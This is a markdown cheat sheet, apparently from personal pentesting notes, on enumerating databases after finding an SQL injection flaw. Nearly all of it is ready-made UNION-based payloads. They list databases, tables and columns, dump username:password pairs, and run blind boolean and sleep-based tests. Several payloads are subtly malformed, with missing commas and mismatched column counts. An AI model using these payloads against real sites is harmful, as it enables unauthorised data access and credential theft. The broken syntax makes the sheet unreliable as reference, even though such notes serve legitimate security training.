# Enumerating SQL Databases
Once you have fonud an sql injection vulnerability you can attempt to enumerate other databases, tables, and columns.

## Injection
Read [SQL Injection](../../Exploitation/Webservers/sql.md) if aren't sure where to start.

## Get Database Name
Get the current database using `database()`, enumerate other databases using `like`
```sh
0 UNION SELECT 1,2 database()

0 UNION SELECT 1,2 database() like '%';--
0 UNION SELECT 1,2 database() like '%a';--
0 UNION SELECT 1,2 database() like '%b';--
0 UNION SELECT 1,2 database() like '%c';--
```

## Get Tables
```sh
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = "<database_name>"
0 UNION SELECT 1,2 FROM information_schema.tables WHERE table_schema = "<database_name>" and table_name like 'a%';--
```

## Get Columns
```sh
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = "<table_name>"
0 UNION SELECT 1,2 FROM information_schema.columns WHERE table_schema = "<db_name>" and table_name = "<table_name>" and column_name like 'a%';
```

Once you have found a column, you'll need to exclude it from the next attempt:
```sh
0 UNION SELECT 1,2 FROM information_schema.columns WHERE table_schema = "<db_name>" AND table_name = "<table_name>" AND column_name LIKE 'a%' AND column_name != 'id';
```


## Retrieve Data
Enumerate data contained in database:

```sh
0 UNION SELECT 1,2,group_concat(username, ':', password SEPARATOR '<br>') FROM <table_name>
0 UNION SELECT 1,2 from users where username like 'a%';
0 UNION SELECT 1,2 from users where username = 'admin' and password like 'a%';
```

## Blind SQLi
Things get interesting when you can't see the results of your tests. 

### Boolean Based
Most applications will run a simple check that returns a boolean (true / false) response. This could be to see if a username exists or authentication related. 

When enumerating columns, tables, and fields you will need to look for that `true` response.
```sh
0 UNION SELECT 1;--
0 UNION SELECT 1,2 database() like '%a';--
```

### Time Based
Introduce a time delay into your queries to test for a successful attack. If the application is delayed by +5 seconds, you have succeeded.
```sh
0 UNION SELECT Sleep(5);--
0 UNION SELECT sleep(5),2 from users where username like 'a%';
```


